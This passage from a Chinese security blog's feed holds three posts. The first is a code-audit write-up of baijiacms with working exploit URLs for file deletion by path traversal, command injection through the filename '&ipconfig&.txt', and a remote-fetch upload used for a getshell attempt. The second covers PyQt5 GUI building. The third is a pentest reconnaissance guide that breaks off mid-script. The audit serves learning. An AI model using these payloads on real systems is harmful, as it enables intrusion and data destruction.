class="hljs-variable">&amp;m</span>=eshop<span class="hljs-variable">&amp;op</span>=<span class="hljs-keyword">remove</span><span class="hljs-variable">&amp;file</span>=test.txt<br></code></pre></td></tr></table></figure><p>成功删除文件</p><p><img src="https://s2.loli.net/2025/01/18/189ruFpToSlM7BZ.png" alt="image-20250118212723814"></p><p>真的如此吗？</p><p><img src="https://s2.loli.net/2025/01/18/qpsTFwndct2X7er.png" alt="image-20250118213015658"></p><p>真的难缠，还是没有成功删除，为什么？因为根据上面的函数执行逻辑可知，这个函数确实执行了，但是开发疏忽了，无论目标文件是否存在都会这样回（此时可以在原函数再加个回显，但是我们不是开发，就不必在乎了），我们再使用<code>../</code>相对路径，看能否删除</p><p><img src="https://s2.loli.net/2025/01/18/jYZGEegtXVkPsu7.png" alt="image-20250118213528864"></p><p>再看，嗯嗯对啦，删除了</p><p><img src="https://s2.loli.net/2025/01/18/wsYifGv4g8dmu2B.png" alt="image-20250118213605956"></p><h3 id="漏洞2：命令执行"><a href="#漏洞2：命令执行" class="headerlink" title="漏洞2：命令执行"></a>漏洞2：命令执行</h3><p>针对命令执行，我们关注的函数肯定是<code>eval</code>、<code>system</code>、<code>exec</code>这几个，所以接下来就尝试去利用全局搜索来寻找可疑点。</p><p>通过检索system函数，找到如下结果</p><p><img src="https://s2.loli.net/2025/01/19/lQNHBmJ9esyToqa.png" alt="image-20250118220103639"></p><p>其函数在一个file_save函数中，找到可控变量file_full_path(文件完整路径)，就看一看如何触发system函数</p><p><img src="https://s2.loli.net/2025/01/18/MijnXGAT51dxoU4.png" alt="image-20250118220128791"></p><p>主要是让<code>(!empty($settings[&#39;image_compress_openscale&#39;]))</code>判断为true，同时根据上面setting的由来”globaSystemSetting()”，其实setting变量就是存储系统设置的一个数据，这个设置需要我们从web界面中去勾选，所以现在就是要定位这个设置的页面在哪</p><p>我们直接全局检索”image_compress_openscale”</p><p><img src="https://s2.loli.net/2025/01/19/ufhGviyXcNOAxbE.png" alt="image-20250118221846095"></p><p>锁定文件netattach.php文件，应该就是设置页面，根据构造路由直接去访问</p><p>其路径为<code>baijiacms\system\manager\template\web\netattach.php</code></p><p>构建url：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">http://baijiacms/<span class="hljs-built_in">index</span>.php?<span class="hljs-built_in">mod</span>=web&amp;act=manager&amp;<span class="hljs-keyword">do</span>=netattach<br></code></pre></td></tr></table></figure><p>然后如下开启即可</p><p><img src="https://s2.loli.net/2025/01/18/WZtJsdhVF4QcENO.png" alt="image-20250118222956999"></p><p>好，现在我们就可以从file_save中接触到system方法了，现在需要file_save被调用的情况。全局检索，发现在setting.php中</p><p><img src="https://s2.loli.net/2025/01/18/VWCSXo6hxGv3KdB.png" alt="image-20250118223149127"></p><p>看一下代码逻辑</p><p><img src="https://s2.loli.net/2025/01/18/34u1cPjCWLFiqyZ.png" alt="image-20250118223333555"></p><p>要先使checksubmit()函数返回为true，然后才能触碰到下一个判断”$extention&#x3D;&#x3D;’txt’”，才会执行到file_save函数，所以我们跟踪checksubmit()，如下</p><p><img src="https://s2.loli.net/2025/01/18/4AdxCM7bDwXf9aQ.png" alt="image-20250118224024064"></p><p>我们只需要保证不进入第一个if（<code>if (!empty($action)&amp;&amp;empty($_GP[$action]))</code>），然后后面随便满足一个即可，第一个判断的逻辑：</p><p>如果传入的 <code>$action</code> 非空，并且 <code>$_GP[$action]</code> （即请求中的某个参数）为空，返回 <code>FALSE</code>。即检查相关操作是否存在，若不存在则返回 <code>FALSE</code>。</p><p>第二个判断是否为get请求，该函数默认变量$allowget为false，肯定就不会让其判断为真</p><p>第三个判断是否为Ajax请求，并且用global定义的变量来判断，我们可以直接GET传参<code>真</code>即可</p><p>现在到下一个突破口<code>$extention==&#39;txt&#39;</code></p><p><img src="https://s2.loli.net/2025/01/18/oD2lPaWdEv1yHV5.png" alt="image-20250118225531949"></p><p>先看extention变量来源于一个文件，应该是页面有个文件上传功能点，extention变量经历了pathinfo函数，该函数就是一个取得文件后缀名的一个函数，然后对后缀名进行小写，判断后缀名是不是txt，所以我们只需要上传一个txt文件就可以判断为真。</p><p><img src="https://s2.loli.net/2025/01/18/HBhteqkQumY1o2d.png" alt="image-20250118225945014"></p><p>从而调用到file_save函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_save</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-variable">$extention</span>,WEB_ROOT.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>],WEB_ROOT.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><p>其中的WEB_ROOT.”&#x2F;“.$file[‘name’]，对应之前的可控变量$file_full_path，所以我们只需要把文件名当作命令，并进行适当闭合，就可以实现命令执行了，开始实践</p><h3 id="漏洞2验证"><a href="#漏洞2验证" class="headerlink" title="漏洞2验证"></a>漏洞2验证</h3><p>查看漏洞文件路径</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">baijiacms\system\weixin\class\web\setting.php<br></code></pre></td></tr></table></figure><p>构造url：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">http://baijiacms/<span class="hljs-built_in">index</span>.php?<span class="hljs-built_in">mod</span>=web&amp;act=weixin&amp;<span class="hljs-keyword">do</span>=setting<br></code></pre></td></tr></table></figure><p>的确有一个上传接口</p><p><img src="https://s2.loli.net/2025/01/18/EBHU8Qnb4XWKqfw.png" alt="image-20250118230744362"></p><p>并构建一个闭合的命令执行的文件：&amp;ipconfig&amp;.txt，如下构造</p><p><img src="https://s2.loli.net/2025/01/18/RCmvHuYc3WjaBIK.png" alt="image-20250118231036243"></p><p>然后直接提交，成功命令执行</p><p><img src="https://s2.loli.net/2025/01/19/vo48ArPnShMpV6D.png" alt="image-20250118231328195"></p><p>不过要插一句这里文件上传，并提交的过程中，应该就是使用的ajax发送的请求，也就不需要再使用GET传入参数<code>isajax=1</code>了</p><h3 id="漏洞3：任意文件上传"><a href="#漏洞3：任意文件上传" class="headerlink" title="漏洞3：任意文件上传"></a>漏洞3：任意文件上传</h3><p>直接定位文件上传函数：move_uploaded_file</p><p><img src="https://s2.loli.net/2025/01/18/VzTFWQBiSICNoJl.png" alt="image-20250118233334173"></p><p><img src="https://s2.loli.net/2025/01/18/R95aXliQC3mpHTM.png" alt="image-20250118233639641"></p><p>但是它是在ExcelModel类中，并且这个类并没有被实例化，就没有深究下去，于是检索了一下关键字upload(</p><p><img src="https://s2.loli.net/2025/01/19/vgbQPj2oi9apXtf.png" alt="image-20250119002109878"></p><p><img src="https://s2.loli.net/2025/01/19/RNIoAmM6PniGC7L.png" alt="image-20250119004852304"></p><p>白名单，而且过滤写得很死，几乎没什么机会</p><p>继续寻找，寻到了fetch_net_file_upload函数方法</p><p><img src="https://s2.loli.net/2025/01/19/CsyOWNHGoSRUcjD.png" alt="image-20250119005126057"></p><p>逻辑如下：使用pathinfo函数，获取了一个文件后缀名，创建文件夹，以&lt;文件名&#x2F;年&#x2F;月&gt;的形式，然后生成随机的文件名，构建文件路径，根据url下载文件，并保存文件。没有什么过滤。</p><p>查看fetch_net_file_upload函数调用关系</p><p><img src="https://s2.loli.net/2025/01/19/zeGyvT3WnbFuY8l.png" alt="image-20250119012650205"></p><p>查看file.php</p><p><img src="https://s2.loli.net/2025/01/19/K7oOq4bXcdrkPxE.png" alt="image-20250119012724804"></p><p>要执行fetch_net_file_upload，要先$do &#x3D;&#x3D; ‘fetch’（GET传参<code>op=fetch</code>），然后传参url即可实现任意文件上传</p><h3 id="漏洞3验证"><a href="#漏洞3验证" class="headerlink" title="漏洞3验证"></a>漏洞3验证</h3><p>老规律定位路由</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">baijiacms\system\<span class="hljs-keyword">public</span>\<span class="hljs-keyword">class</span>\web\<span class="hljs-keyword">file</span>.php<br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">http://baijiacms/<span class="hljs-keyword">index</span>.php?mod=web<span class="hljs-variable">&amp;act</span>=public<span class="hljs-variable">&amp;do</span>=<span class="hljs-keyword">file</span><span class="hljs-variable">&amp;op</span>=fetch<span class="hljs-variable">&amp;url</span>=http://cmseasy/phpinfo.php<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/01/19/zEWnB3AUxP9iVF5.png" alt="image-20250119014233667"></p><p>访问，成功getshell！</p><p><img src="https://s2.loli.net/2025/01/19/TZywv5jxGoC42Eb.png" alt="image-20250119014114999"></p><p>本地以为就这么getshell，结果回头一瞧。哥们就这么水灵灵被当作前端代码，给露出来了</p><p><img src="https://s2.loli.net/2025/01/19/6zGYbi2TyqEUCgH.png" alt="image-20250119023515937"></p><p>只能得到一个存储xss</p><p>修改phpinfo.php文件中的内容</p><p><img src="https://s2.loli.net/2025/01/19/rcmJUxfFGhBjliv.png" alt="image-20250119023833014"></p><p><img src="https://s2.loli.net/2025/01/19/tLr3nkPe7OWuaqF.png" alt="image-20250119023859170"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>初识审计，学到了很多！如何比较快速地寻找路由，审计的大概思路和顺序，对之后的审计也越来越自信了，不过还是很缺乏独自挖掘漏洞的能力，所以还是要多看看大佬们的审计文章，努力赶上佬们！！！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>开发日记——python(1)</title>
    <link href="/2024/12/21/%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%E2%80%94%E2%80%94python-1/"/>
    <url>/2024/12/21/%E5%BC%80%E5%8F%91%E6%97%A5%E8%AE%B0%E2%80%94%E2%80%94python-1/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="python图形化（1）"><a href="#python图形化（1）" class="headerlink" title="python图形化（1）"></a>python图形化（1）</h1><p>作为一个向往图形化工具的网安人，频繁使用一些cmd脚本，多cmd窗口，总是让我心烦意乱。于是心生一计，为什么不能自己做一个综合型的图形化工具页面呢，那最便捷的脚本语言python语言肯定首当其冲。于是有了这一篇开发小日记的诞生。鄙人不会开发，只是小懂门道，<strong>大佬轻点喷</strong>。</p><p>下面就看一看基本实现的思路。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-number">1</span><span class="hljs-operator">、</span>构建基本<span class="hljs-type">UI界面</span><br><span class="hljs-number">2</span><span class="hljs-operator">、</span><span class="hljs-type">UI转为py文件</span><br><span class="hljs-number">3</span><span class="hljs-operator">、</span>相关事件绑定函数<br><span class="hljs-number">4</span><span class="hljs-operator">、</span>一些<span class="hljs-type">UI的小细节</span><br><span class="hljs-number">5</span><span class="hljs-operator">、</span>多页面联合<br><span class="hljs-number">6</span><span class="hljs-operator">、</span>转换exe文件<span class="hljs-operator">。</span><br></code></pre></td></tr></table></figure><h2 id="1、构建基本UI界面"><a href="#1、构建基本UI界面" class="headerlink" title="1、构建基本UI界面"></a>1、构建基本UI界面</h2><p>这是我们是基于pyqt5这个py库实现的，所以要先安装一些库</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> PyQt5<br>pip <span class="hljs-keyword">install</span> PyQt5-tools<br></code></pre></td></tr></table></figure><p>安装之后，我们直接全局搜索一个文件（我用的everything），designer.exe，这个就是我们设计UI的可执行文件。</p><p><img src="https://s2.loli.net/2024/12/21/XenCV45OtRH8fzG.png" alt="image-20241220215343401"></p><p>直接创建一个</p><p><img src="https://s2.loli.net/2024/12/21/GI1EpW3J8wYlZzV.png" alt="image-20241220215435603"></p><p>设置一个你想要的程序的基本页面大小</p><p><img src="https://s2.loli.net/2024/12/21/CDjOBri8KTgbXWA.png" alt="image-20241220215608972"></p><p>然后就左边的状态栏就是一些基本的图窗、标签、按钮。下面就介绍一些常用的吧！</p><p><img src="https://s2.loli.net/2024/12/21/Q8zvFZHK91IR5Mq.png" alt="image-20241220220233434"></p><p>还有</p><p><img src="https://s2.loli.net/2024/12/20/Oui2Y6D1hmM3rS7.png" alt="image-20241220221933932"></p><p>然后就设计你想要的界面</p><h2 id="2、UI转为py文件"><a href="#2、UI转为py文件" class="headerlink" title="2、UI转为py文件"></a>2、UI转为py文件</h2><p>然后ctr+s保存为.ui文件，然后使用以下命令把UI文件转换为py文件。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pyuic5 -o destination<span class="hljs-selector-class">.py</span> source<span class="hljs-selector-class">.ui</span> <br></code></pre></td></tr></table></figure><h2 id="3、相关事件绑定函数"><a href="#3、相关事件绑定函数" class="headerlink" title="3、相关事件绑定函数"></a>3、相关事件绑定函数</h2><p>如果全懵的情况下：可以参考一下Pyqt5的教程（但是我没有看，因为在实操的过程其实就会懂了）：</p><p><a href="https://www.cainiaoya.com/pyqt5/pyqt5-jiaocheng.html">https://www.cainiaoya.com/pyqt5/pyqt5-jiaocheng.html</a></p><p>我们要把我们的一些按钮与一些函数绑定，函数有两种方式</p><p>1、在类中定义函数，然后通过connect与类中的函数call_icpsearch相绑定</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">self<span class="hljs-selector-class">.pushButton_2</span><span class="hljs-selector-class">.clicked</span><span class="hljs-selector-class">.connect</span>(self.call_icpsearch) <br></code></pre></td></tr></table></figure><p>2、函数在类外部，通过匿名函数的形式进行绑定。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">self<span class="hljs-selector-class">.pushButton_5</span><span class="hljs-selector-class">.clicked</span><span class="hljs-selector-class">.connect</span>(lambda: <span class="hljs-built_in">extract_ip</span>(self))<br></code></pre></td></tr></table></figure><p>在函数setupUi里面去写代码，连接代码</p><p><img src="https://s2.loli.net/2024/12/21/FVJp3uAxGCZTeO8.png" alt="image-20241221105920424"></p><p>然后在Ui_Dialog类中，写入我们的函数。</p><p>我们先进行文本框的代码定位：</p><p><img src="https://s2.loli.net/2024/12/21/oF5y2qkIPf9DXZn.png" alt="image-20241221131511679"></p><p>然后就是如何调用UI的一些按钮和文本了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">我们确定一个文本为例（self.textBrowser）<br>self.textBrowser.toPlainText()  //获取文本的内容<br>self.textBrowser.clear()//清空文本框<br>self.textBrowser.append()//文本增加<br>self.textBrowser.setText()//文本设置<br><br>简单写一个函数：<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">call_icpsearch</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 获取每一行输入</span><br>        input_text = self.textEdit_4.toPlainText()<br>        lines = input_text.splitlines()  <span class="hljs-comment"># 按行分割</span><br><br>        <span class="hljs-comment"># 清空输出框</span><br>        self.textBrowser_2.clear()<br><br>        <span class="hljs-comment"># 逐行处理每一行数据</span><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>            line = line.strip()  <span class="hljs-comment"># 去除每行的空格和换行符</span><br>            <span class="hljs-keyword">if</span> line:  <span class="hljs-comment"># 如果该行不为空</span><br>                result = self.run_command(line)<br>                self.textBrowser_2.append(<span class="hljs-string">f&quot;查询：<span class="hljs-subst">&#123;line&#125;</span>\n结果：\n<span class="hljs-subst">&#123;result&#125;</span>\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;-&#x27;</span> * <span class="hljs-number">40</span>&#125;</span>\n&quot;</span>)<br>     <br></code></pre></td></tr></table></figure><p>待自己想要的功能都实现之后，可以把下述代码放在全部代码之后，运行即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app = QtWidgets.QApplication(sys.argv)<br>    Dialog = QtWidgets.QDialog()<br>    ui = Ui_Dialog()<br>    ui.setupUi(Dialog)<br>    Dialog.show()<br>    sys.<span class="hljs-keyword">exit</span>(app.exec_())<br></code></pre></td></tr></table></figure><h2 id="4、一些UI的小细节"><a href="#4、一些UI的小细节" class="headerlink" title="4、一些UI的小细节"></a>4、一些UI的小细节</h2><p>1、启动代码要放在全局，前面不能有缩进</p><p>2、保存窗口标题栏的最小化、最大化、取消按钮。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Dialog<span class="hljs-selector-class">.setWindowFlags</span>(QtCore<span class="hljs-selector-class">.Qt</span>.Window)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/21/91wB4JUcjk3N8zH.png" alt="image-20241221132202286"></p><p>3、调用本地程序的函数，最好不要放在主文件，我也不清楚为什么把调用本地程序的函数包装到其他py文件后，运行相关功能后，UI就会闪退。</p><h2 id="5、多页面联合"><a href="#5、多页面联合" class="headerlink" title="5、多页面联合"></a>5、多页面联合</h2><p>使用QStackedWidget来组合。建一个main.py来管理各个界面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建 QStackedWidget 来显示不同的页面</span><br>self.stackedWidget = QStackedWidget(MainWindow)<br>self.stackedWidget.setGeometry(QtCore.QRect(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1104</span>, <span class="hljs-number">876</span>))<br><br><span class="hljs-comment">#界面1的调用</span><br>        <span class="hljs-comment"># 页面 1 - 信息收集（加载 1.py 界面）</span><br>        self.page_1 = QtWidgets.QWidget()<br>        self.stackedWidget.addWidget(self.page_1)<br>        self.page_1_ui = Ui_Dialog()  <span class="hljs-comment"># 创建1.py界面实例</span><br>        self.page_1_ui.setupUi(self.page_1)  <span class="hljs-comment"># 加载1.py界面</span><br>        <br><span class="hljs-comment">#界面1的切换按钮</span><br>        <span class="hljs-comment"># 切换按钮</span><br>        self.button_1 = QtWidgets.QPushButton(MainWindow)<br>        self.button_1.setGeometry(QtCore.QRect(<span class="hljs-number">40</span>, <span class="hljs-number">10</span>, <span class="hljs-number">121</span>, <span class="hljs-number">26</span>))<br>        self.button_1.setText(<span class="hljs-string">&quot;信息收集&quot;</span>)<br>        self.button_1.clicked.connect(self.show_page_1)<br><span class="hljs-comment">#切换的函数</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show_page_1</span>(<span class="hljs-params">self</span>):<br>        self.stackedWidget.setCurrentIndex(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 显示页面1</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/21/J4BCRjqFgr7wGQV.png" alt="image-20241221133210241"></p><p><img src="https://s2.loli.net/2024/12/21/612IlGwAFsB3HJp.png" alt="image-20241221133820229"></p><p>然后就是启动代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app = QApplication(sys.argv)<br><br>    <span class="hljs-comment"># 创建并初始化主界面</span><br>    MainWindow = QMainWindow()<br>    ui = Ui_MainWindow()  <span class="hljs-comment"># 创建主界面实例</span><br>    ui.setupUi(MainWindow)  <span class="hljs-comment"># 设置UI界面</span><br><br>    MainWindow.show()  <span class="hljs-comment"># 显示主界面</span><br><br>    sys.<span class="hljs-keyword">exit</span>(app.exec_())  <span class="hljs-comment"># 启动事件循环</span><br></code></pre></td></tr></table></figure><p>多个界面就是以此去确定了。不过要记得把每个界面的py文件的类修改一下，一个Ui_Dialog，一个Ui_Dialog_2这种，不然会冲突。修改之后，也要在main.py中修改。</p><h2 id="6、转换exe文件"><a href="#6、转换exe文件" class="headerlink" title="6、转换exe文件"></a>6、转换exe文件</h2><p>如何转换为exe文件？使用Pyinstaller包。</p><p>pip install Pyinstaller</p><p>然后直接Pyinstaller </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pyinstaller <span class="hljs-attr">--onefile</span> <span class="hljs-attr">--windowed</span> <span class="hljs-attr">--icon</span>=<span class="hljs-number">2</span>_QEM_icon<span class="hljs-selector-class">.ico</span> Yf_UI<span class="hljs-selector-class">.py</span><br><br><span class="hljs-attr">--windowed</span>：关闭窗口<br><span class="hljs-attr">--icon</span>=xxx.ico：设置程序图标<br>你可以把png、jpg等文件转换为ico图片<br>https:<span class="hljs-comment">//icoconvert.com/</span><br></code></pre></td></tr></table></figure><h2 id="成品展示"><a href="#成品展示" class="headerlink" title="成品展示"></a>成品展示</h2><p>下面就是我自己弄得一个基本小成品，不过我没有包装成exe文件。</p><p>参考项目：</p><p><a href="https://github.com/Yf3te/Yf_UI">https://github.com/Yf3te/Yf_UI</a></p><p><img src="https://s2.loli.net/2024/12/21/Ue2copnvOPdZ98Q.png" alt="image-20241221143342225"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>超干信息收集，让资产无路可退！</title>
    <link href="/2024/12/19/%E8%B6%85%E5%B9%B2%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%8C%E8%AE%A9%E8%B5%84%E4%BA%A7%E6%97%A0%E8%B7%AF%E5%8F%AF%E9%80%80%EF%BC%81/"/>
    <url>/2024/12/19/%E8%B6%85%E5%B9%B2%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%8C%E8%AE%A9%E8%B5%84%E4%BA%A7%E6%97%A0%E8%B7%AF%E5%8F%AF%E9%80%80%EF%BC%81/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="超干信息收集，让资产无路可退！"><a href="#超干信息收集，让资产无路可退！" class="headerlink" title="超干信息收集，让资产无路可退！"></a>超干信息收集，让资产无路可退！</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>俗话说，信息收集是渗透的过程中的重中之重！好的信息收集可以在渗透过程中让我们行云流水。而且信息收集对条理度和深浅都有严格把关，我们应该尽量地有条理性地进行深度信息收集！以下就是我信息收集思路，尽量做到深入和有条理性。</p><h2 id="内容框架"><a href="#内容框架" class="headerlink" title="内容框架"></a>内容框架</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>、资产形势分析<br><span class="hljs-number">2</span>、主域名收集<br><span class="hljs-number">3</span>、子域名<br><span class="hljs-number">4</span>、IP全端口+c段<br><span class="hljs-number">5</span>、指纹识别<br><span class="hljs-number">6</span>、单个站点收集<br><span class="hljs-number">7</span>、Edusrc专属收集<br><span class="hljs-number">8</span>、供应链收集<br><span class="hljs-number">9</span>、小程序<span class="hljs-meta">&amp;公众号</span><br><span class="hljs-number">10</span>、APK信息收集<br><span class="hljs-number">11</span>、国外站点的信息收集<br><span class="hljs-number">12</span>、偏僻子域名收集<br><span class="hljs-number">13</span>、政府相关信息收集<br><span class="hljs-number">14</span>、自动化信息收集<br></code></pre></td></tr></table></figure><h2 id="分析当前形势"><a href="#分析当前形势" class="headerlink" title="分析当前形势"></a>分析当前形势</h2><p>一来就扯信息搜集，就有点太公式化了。所以我想说的是，无论我们做什么事情，都必须先就目前的情况对事情的目标有清晰的了解和挖掘！</p><p>目前，国内的资产主要分为<strong>政府</strong>和<strong>企业</strong>，也是我们渗透的主要目标。而无论是哪一个，他们的内部资产都是错综复杂的，我们要做好信息收集就必须摸清楚他们内部的资产关系。</p><p>其次我们一般都很少碰政府的资产，因为政府这个特殊机构内部包含很多敏感文件，我们的一旦在渗透过程中出现什么纰漏，就很容易威胁到自己的人身安全。并且国家也对这方面也把关得很严。所以我们除了在一些护网的时候，有了授权书，正大光明地渗透之外，其实还是少触碰政府相关的资产，但是也要学习，说不定哪天就用上了呢。</p><p>那就先捣鼓捣鼓企业的信息收集。</p><h2 id="企业的信息收集"><a href="#企业的信息收集" class="headerlink" title="企业的信息收集"></a>企业的信息收集</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>对于企业而言，内部的资产都离不开”控股”二字。每个企业都由主公司和多个子公司组成，而在每个子公司也可能会有子公司的存在。</p><h3 id="企业主域名收集"><a href="#企业主域名收集" class="headerlink" title="企业主域名收集"></a>企业主域名收集</h3><h4 id="1、股权树："><a href="#1、股权树：" class="headerlink" title="1、股权树："></a>1、股权树：</h4><p>作用：清晰地尽可能地通过公司名获取全部<strong>主域名</strong>目标</p><p>在企查查中根据”股权穿透图”梳理股权树</p><p><img src="https://s2.loli.net/2024/12/19/yhFzCbXIDfBOWro.png" alt="img"></p><p>采用”<strong>先上查后，向下查</strong>“，确保上下查到底，<strong>资产大，小于50%股份子公司的直接舍弃</strong>，<strong>资产小就都收集</strong>，梳理成股权树，目的是为了得到大量的目标公司名。</p><h4 id="2、法人、企业高管"><a href="#2、法人、企业高管" class="headerlink" title="2、法人、企业高管"></a>2、法人、企业高管</h4><p>适用于中小型，大厂的法定人、高管大部分与其他公司有关联，容易有很多无关目标。然后一定要对上述的股权树重新梳理，得到最为完整的股权树。</p><p>通过在企查查中再次搜索法定人来获取公司名。</p><p><img src="https://s2.loli.net/2024/12/19/VQoNpWjGk8fs2CI.png" alt="image-20241219201332849"></p><h4 id="3、ICP备案"><a href="#3、ICP备案" class="headerlink" title="3、ICP备案"></a>3、ICP备案</h4><p>在国内，只要想合法搭建网站，就需要ICP备案。所以我们从icp备案查询来打开突破口。</p><p>ICP三大因素：企业名、备案号、域名。可以通过其中之一查找到另外两个，查询方式如下：</p><p>​3.1<a href="https://www.beianx.cn/">官网</a>查询</p><ul><li>使用之前收集的公司名，直接查询</li><li>再次利用得到的备案号再次查询</li></ul><p><img src="https://s2.loli.net/2024/12/19/nEj2vHotsaiImY8.png" alt="image-20241216001651448"></p><p>​3.2批量查询</p><p>一个一个去查确实太慢了，所以我们利用icpsearch来直接批量查询</p><p>​<a href="https://github.com/A10ha/ICPSearch">ICPsearch</a></p><p>但是输出格式还是不好直接利用的，我们就写个小脚本（下面自写的所有小脚本先别急用，我为了可视化用python自动写了一个UI（在全端口扫描之前附得有github地址）来使用，希望有用），单独提取其中的备案号、域名、公司。</p><p><img src="https://s2.loli.net/2024/12/19/c5tr4QEbxHIM6od.png" alt="image-20241216001659613.png"></p><p>脚本：可把官网查询结果ctrl+c直接复制下来，保存在result.txt或者直接把工具得到的result.txt，然后使用该脚本来提取三大因素保存到result.xlsx</p><p>不过第一用公司名查询后，后面一定要通过备案号再查一次，<strong>一定一定！！！</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 